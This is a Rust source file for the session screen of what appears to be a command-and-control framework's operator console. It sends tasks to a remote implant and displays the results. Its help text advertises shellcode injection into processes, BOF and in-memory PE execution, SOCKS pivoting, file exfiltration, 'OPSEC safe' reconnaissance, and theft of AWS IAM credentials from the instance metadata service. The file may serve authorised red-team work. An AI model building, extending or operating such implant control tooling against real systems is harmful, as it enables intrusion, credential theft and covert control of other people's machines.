use std::time::{Duration, Instant};

use dioxus::prelude::*;
use crate::{show_toast, AppState, Route};
use crate::services::api;
use crate::services::output::{decode_base64_urlsafe_no_pad, process_retrieved_output, try_handle_getfile};

#[component]
pub fn SessionView(state: AppState, session_id: String, sleep: String, os: String) -> Element {
    let mut command = use_signal(|| String::new());
    let mut show_sleep = use_signal(|| false);
    let mut show_socks = use_signal(|| false);

    let short_id = {
        let s = session_id.clone();
        s.chars()
            .rev()
            .take(8)
            .collect::<String>()
            .chars()
            .rev()
            .collect::<String>()
    };

    let on_send = {
        let mut cmd_sig = command.clone();
        let state_clone = state.clone();
        let os_for_help = os.clone();
        let sid_outer = session_id.clone();
        move |_| {
            let text = cmd_sig.read().clone();
            if text.is_empty() { return; }
            let task_text = text.clone();
            let sid2 = sid_outer.clone();
            let mut state_for_async = state_clone.clone();
            let first = task_text.split_whitespace().next().unwrap_or("");
            match first {
                "help" => {
                    let help_text = {
                        let os_lower = os_for_help.to_lowercase();
                        if os_lower.contains("windows") {
                            "Available commands:\nhelp - displays this help information\r\nwhoami - OPSEC 'safe' priv check\r\nipconfig - OPSEC 'safe' ipconfig\r\nps - list user processes\r\ncd <dir> - change directory\r\npwd - print working directory\r\nls <dir> - list directory contents\r\ncatfile <remote_file> - read file content directly\r\ngetfile <remote_file> - download file to local disk\r\nsendfile <local_filepath> - upload file to implant\r\ncmd <cmd> - run cmd command\r\npwsh <cmd> - run powershell command\r\nwmi <query> - run WMI query\r\nbof <file> - run BOF file\r\ninject <pid> <shellcode.bin> - inject shellcode into process\r\nrunpe <file> - run dotnet PE file\r\nsocks <ip> <port> - start socks proxy\r\nsleep <seconds> <jitter percentage> - change sleep.\r\nkill - kill the implant\r\nq or quit - exit imp session\r"
                        } else if os_lower.contains("linux") {
                            "Available commands:\nhelp - displays this help information\r\nwhoami - get username\r\naws_imds - query AWS IMDS (169.254.169.254) for IAM credentials\r\ncd <dir> - change directory\r\npwd - print working directory\r\nls <dir> - list directory contents\r\ncatfile <remote_file> - read file content directly\r\ngetfile <remote_file> - download file to local disk\r\nsendfile <local_filepath> - upload file to implant\r\nsh <cmd> - run shell command\r\nsocks <ip> <port> - start socks proxy\r\nsleep <seconds> <jitter percentage> - change sleep.\r\nkill - kill the implant\r\nq or quit - exit imp session\r"
                        } else {
                            "Available commands:\nhelp - displays this help information\r\nwhoami\r\nipconfig\r\nps\r\ncd/pwd/ls/catfile/getfile\r\nsendfile\r\ncmd/pwsh/sh/wmi\r\nbof/inject/runpe\r\nsocks\r\nsleep\r\nkill\r\nq or quit\r"
                        }
                    };
                    let mut guard = state.output_lines.write();
                    for line in help_text.lines() { guard.push_back(line.to_string()); }
                }
                "q" | "quit" => {
                    *state.route.write() = Route::Dashboard;
                }
                _ => {
                    spawn(async move {
                        if let (Some(tok), url) = (state_for_async.token.read().clone(), state_for_async.base_url.read().clone()) {
                            match crate::services::session_cmd::issue_session_task(
                                &url,
                                tok.as_str(),
                                &sid2,
                                task_text.as_str(),
                            )
                            .await
                            {
                                Ok(()) => {}
                                Err(e) => {
                                    show_toast(
                                        &state_for_async,
                                        format!("Session command failed: {e}"),
                                    );
                                    let mut g = state_for_async.output_lines.write();
                                    g.push_back(format!("[session] {e}"));
                                }
                            }
                        }
                    });
                }
            }
            cmd_sig.set(String::new());
        }
    };

    let lines = state.output_lines.read().clone();

    let line_prefix = format!("{}:", short_id);

    // Poll output periodically (`since_id` + team-wide server buffer — upgrade-plan §2.9)
    {
        let state_for_cfg = state.clone();
        let mut out_sig = state.output_lines.clone();
        let prefix = line_prefix.clone();
        use_future(move || {
            let pfx = prefix.clone();
            let mut poll_st = state_for_cfg.clone();
            async move {
            let mut last_poll_notify = Instant::now() - Duration::from_secs(600);
            loop {
                if let (Some(tok), url) = (poll_st.token.read().clone(), poll_st.base_url.read().clone()) {
                    let since = *poll_st.output_cursor.read();
                    match api::retrieve_all_out(&url, tok.as_str(), since).await {
                        Ok((raw_b64, max_id)) => {
                            *poll_st.output_cursor.write() = max_id;
                            if let Some(decoded) = decode_base64_urlsafe_no_pad(&raw_b64) {
                                let decoded = decoded.trim();
                                if decoded == "none" || decoded.is_empty() {
                                    // no new output
                                } else {
                                    for line in process_retrieved_output(decoded) {
                                        let line = line.trim_end();
                                        if line.is_empty() {
                                            continue;
                                        }
                                        if line.starts_with(&pfx) {
                                            if let Some(saved_msg) = try_handle_getfile(line) {
                                                let mut guard = out_sig.write();
                                                guard.push_back(saved_msg);
                                            } else {
                                                let mut guard = out_sig.write();
                                                guard.push_back(line.to_string());
                                            }
                                        } else {
                                            // Multiline task output: continuation lines lack the session prefix.
                                            let mut guard = out_sig.write();
                                            if let Some(last) = guard.back_mut() {
                                                last.push('\n');
                                                last.push_str(line);
                                            } else {
                                                guard.push_back(line.to_string());
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        Err(e) => {
                            let now = Instant::now();
                            if now.duration_since(last_poll_notify) >= Duration::from_secs(15) {
                                last_poll_notify = now;
                                show_toast(
                                    &poll_st,
                                    format!("Output poll failed: {e}"),
                                );
                                let mut guard = out_sig.write();
                                guard.push_back(format!("[output poll] {e}"));
                            }
                        }
                    }
                }
                tokio::time::sleep(std::time::Duration::from_secs(3)).await;
            }
            }
        });
    }

    let sid_base = session_id.clone();
    let sid_who = sid_base.clone();
    let sid_ps = sid_base.clone();
    let sid_ip = sid_base.clone();
    let sid_sleep_sid = sid_base.clone();
    let sid_socks_sid = sid_base.clone();
    rsx! {
        div { class: "session_view",
            div { class: "session_header",
                h2 { "Session: {short_id}" }
                div { class: "session_meta", "OS: {os} | Sleep: {sleep}s" }
            }
            div { class: "quick_actions",
                    // generic task buttons
                    button { onclick: {
                            let st = state.clone(); let sid_val = sid_who.clone();
                            move |_| { if let (Some(tok), url) = (st.token.read().clone(), st.base_url.read().clone()) { let sidc = sid_val.clone(); spawn(async move { let _ = api::issue_task(&url, tok.as_str(), &sidc, "whoami").await; }); } }
                        }, "whoami" }
                    button { onclick: {
                            let st = state.clone(); let sid_val = sid_ps.clone();
                            move |_| { if let (Some(tok), url) = (st.token.read().clone(), st.base_url.read().clone()) { let sidc = sid_val.clone(); spawn(async move { let _ = api::issue_task(&url, tok.as_str(), &sidc, "ps").await; }); } }
                        }, "ps" }
                    button { onclick: {
                            let st = state.clone(); let sid_val = sid_ip.clone();
                            move |_| { if let (Some(tok), url) = (st.token.read().clone(), st.base_url.read().clone()) { let sidc = sid_val.clone(); spawn(async move { let _ = api::issue_task(&url, tok.as_str(), &sidc, "ipconfig").await; }); } }
                        }, "ipconfig" }
                    // dialogs
                    button { onclick: move |_| show_sleep.set(true), "sleep…" }
                    button { onclick: move |_| show_socks.set(true), "socks…" }
                    button { onclick: {
                            let st = state.clone(); let sid = session_id.clone();
                            move |_| { if let (Some(tok), url) = (st.token.read().clone(), st.base_url.read().clone()) { let sidc = sid.clone(); spawn(async move { let _ = api::issue_task(&url, tok.as_str(), &sidc, "kill").await; }); } }
                        }, "kill" }
            }
            div { id: "session_output", class: "session_output scrollable_output",
                for line in lines.iter() {
                    if line.trim() != "none" { div { class: "out_line", "{line}" } }
                }
            }
            div { class: "session_input",
                input { r#type: "text", value: "{command}", oninput: move |e| command.set(e.value()), placeholder: "Command (bof, sendfile, inject, runpe, ...)" }
                button { onclick: on_send, "Send" }
            }
            if *show_sleep.read() { 
                crate::components::sleep_dialog::SleepDialog {
                    on_close: move |_| show_sleep.set(false),
                    on_submit: move |(secs, jit)| {
                        if let (Some(tok), url) = (state.token.read().clone(), state.base_url.read().clone()) {
                            let sid = sid_sleep_sid.clone();
                            spawn(async move {
                                let task = format!("sleep {} {}", secs, jit);
                                let _ = api::issue_task(&url, tok.as_str(), &sid, &task).await;
                            });
                        }
                        show_sleep.set(false);
                    }
                }
            }
            if *show_socks.read() {
                crate::components::socks_dialog::SocksDialog {
                    on_close: move |_| show_socks.set(false),
                    on_submit: move |port| {
                        if let (Some(tok), url) = (state.token.read().clone(), state.base_url.read().clone()) {
                            let sid = sid_socks_sid.clone();
                            spawn(async move {
                                let task = format!("socks {}", port);
                                let _ = api::issue_task(&url, tok.as_str(), &sid, &task).await;
                            });
                        }
                        show_socks.set(false);
                    }
                }
            }
        }
    }
}


